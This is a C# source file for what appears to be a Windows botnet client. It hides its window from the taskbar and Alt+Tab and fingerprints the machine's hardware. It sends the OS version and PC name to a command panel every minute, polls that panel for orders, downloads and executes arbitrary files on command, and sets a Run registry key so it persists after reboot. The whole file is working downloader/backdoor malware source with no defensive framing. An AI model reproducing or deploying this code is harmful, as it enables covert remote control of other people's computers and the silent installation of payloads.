using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using Microsoft.Win32;
using System.Diagnostics;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Collections.Generic;
using System.Globalization;
using System.Security.Cryptography;
using System.Text;

namespace dongs
{
    public partial class Form1 : Form
    {
        protected override CreateParams CreateParams//This is how we will hide from the alt+Tab
        {
            get
            {
                var Params = base.CreateParams;
                Params.ExStyle |= 0x80;
                return Params;
            }
        }

        public Form1()
        {
            Opacity = 0; // makes the form invinsible
            ShowInTaskbar = false; //Lets it not display in the menu bar @ windblows

            InitializeComponent();
        }

 
        #region HWID

        private static string GetHash(string s) // A hash generator for our HWID
        {
            MD5 sec = new MD5CryptoServiceProvider();
            byte[] bt = Encoding.ASCII.GetBytes(s);
            return GetHexString(sec.ComputeHash(bt));
        }

        private static string GetHexString(IList<byte> bt)
        {
            string s = string.Empty;
            for (int i = 0; i < bt.Count; i++)
            {
                byte b = bt[i];
                int n = b;
                int n1 = n & 15;
                int n2 = (n >> 4) & 15;
                if (n2 > 9)
                    s += ((char)(n2 - 10 + 'A')).ToString(CultureInfo.InvariantCulture);
                else
                    s += n2.ToString(CultureInfo.InvariantCulture);
                if (n1 > 9)
                    s += ((char)(n1 - 10 + 'A')).ToString(CultureInfo.InvariantCulture);
                else
                    s += n1.ToString(CultureInfo.InvariantCulture);
                if ((i + 1) != bt.Count && (i + 1) % 2 == 0) s += "-";
            }
            return s;
        }

        private static string Identifier(string wmiClass, string wmiProperty, string wmiMustBeTrue)
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementBaseObject mo in moc)
            {
                if (mo[wmiMustBeTrue].ToString() != "True") continue;

                if (result != "") continue;
                try
                {
                    result = mo[wmiProperty].ToString();
                    break;
                }
                catch
                {
                }
            }
            return result;
        }

        private static string Identifier(string wmiClass, string wmiProperty)
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementBaseObject mo in moc)
            {
                //Only get the first one
                if (result != "") continue;
                try
                {
                    result = mo[wmiProperty].ToString();
                    break;
                }
                catch
                {
                }
            }
          
            return result;
        }
       

        //strings for system info
        private static string BiosID;
        private static string BaseID;
        private static string DiskID;
        private static string Videoid;
        private static string Macid;
        private static string CPUid;
        private static string OS_Version;
        private static string PC_NAME;
        private static string PANEL_URL = "192.168.2.7";

        private void GetIDs()
        {
            string retVal = Identifier("Win32_Processor", "UniqueId");
            if (retVal != "") CPUid = retVal;
            retVal = Identifier("Win32_Processor", "ProcessorId");
            if (retVal != "") CPUid = retVal;
            retVal = Identifier("Win32_Processor", "Name");
            if (retVal == "") //If no Name, use Manufacturer
            {
                retVal = Identifier("Win32_Processor", "Manufacturer");
                CPUid = retVal;
            }
            
            retVal += Identifier("Win32_Processor", "MaxClockSpeed");
            BiosID = Identifier("Win32_BIOS", "Manufacturer") + Identifier("Win32_BIOS", "SMBIOSBIOSVersion") + Identifier("Win32_BIOS", "IdentificationCode") + Identifier("Win32_BIOS", "SerialNumber") + Identifier("Win32_BIOS", "ReleaseDate") + Identifier("Win32_BIOS", "Version");
            Videoid = Identifier("Win32_VideoController", "DriverVersion") + Identifier("Win32_VideoController", "Name");
            BaseID = Identifier("Win32_BaseBoard", "Model") + Identifier("Win32_BaseBoard", "Manufacturer") + Identifier("Win32_BaseBoard", "Name") + Identifier("Win32_BaseBoard", "SerialNumber");
            DiskID = Identifier("Win32_DiskDrive", "Model") + Identifier("Win32_DiskDrive", "Manufacturer") + Identifier("Win32_DiskDrive", "Signature") + Identifier("Win32_DiskDrive", "TotalHeads");
            Macid = Identifier("Win32_NetworkAdapterConfiguration", "MACAddress", "IPEnabled");
        }


 
        private static string _fingerPrint = string.Empty;
        private static string HWID()
        {
            if (string.IsNullOrEmpty(_fingerPrint))
            { 
                _fingerPrint = GetHash("CPU >> " + CPUid + "\nBIOS >> " + BiosID + "\nBASE >> " + BaseID + "\nDISK >> " + DiskID + "\nVIDEO >> " + Videoid + "\nMAC >> " + Macid);

            }
            return _fingerPrint;
        }

        #endregion
    

    private void Form1_Load(object sender, EventArgs e)
        {
         
        // OS version
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
        OS_Version = (string)registryKey.GetValue("productName");
        PC_NAME = Environment.MachineName;
            SendAlive();
        }


        public void CommandsRespond()
        {
            using (var client = new dongclient())
            {
                string test = client.DownloadString("http://" + PANEL_URL + "/command.php?uid=" + HWID() + "&task=");

                Console.WriteLine(test);
                if (test.Length == 0)
                {
          
                }else if(test.Contains("dl"))
                {
                    // Download and execute
                    string[] DllURL = test.Split(',');
                    //test to display dll url
                    string URL = DllURL[1];

                    Console.Write(URL);
                    Uri Dongs = new System.Uri(URL);
                    string[] Filename = URL.Split('/');
                    Download(Dongs, Filename[3]);
                    client.DownloadString("http://" + PANEL_URL + "/command.php?uid=" + HWID() +  "&task=dl");

                }   else if(test.Contains("update")) {
                    string URL = "";

                    Uri UpdateFile = new System.Uri(URL);
                    string[] Filename = URL.Split('/');
                    Download(UpdateFile, Filename[3]);
                    OnStartup(Filename[3], true);

                    client.DownloadString("http://" + PANEL_URL + "/command.php?uid=" + HWID() + "&task=update"); 
                    }
            }
        }

        #region OnStartup
        private void OnStartup(string appname, bool startup)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (startup == true)
                rk.SetValue(appname, Application.ExecutablePath.ToString());
            else
                rk.DeleteValue(appname, false);

        }
        #endregion

        #region Download And Execute

        static string FileToRun;
        public void Download(Uri URL, string Filename)
        {
            try{
                using (var client = new dongclient())
                {

                    FileToRun = Filename;

                    client.DownloadFileAsync(URL, Filename);
                    client.DownloadFileCompleted += new AsyncCompletedEventHandler(Run);

                }
            }catch(Exception) { }
        }

        public void Run(object sender, AsyncCompletedEventArgs e)
        {
            Console.WriteLine(FileToRun);
            Process Execute = new Process();
            Execute.StartInfo.FileName = FileToRun;
            Execute.StartInfo.Arguments = "";
            Execute.Start();
        }
        #endregion

        public async  void SendAlive()
        {
            using (var client = new dongclient())
            {
                while (1 == 1)
                 {
                   try
                   {
                    // We will send that we are alive
                    var values = new NameValueCollection { { "os", OS_Version }, { "uid", HWID() }, { "name", PC_NAME } };
                    client.Headers.Add("user-agent", "HeHDoNgS");
                    client.UploadValues("http://" + PANEL_URL + "/accept.php", values);
 
                        CommandsRespond();
                        await Task.Delay(60000);
                    } catch (Exception) { SendAlive(); await Task.Delay(120000);  } // If it's not alive we will just try to send it again 
              }
            }
        }
    }
}
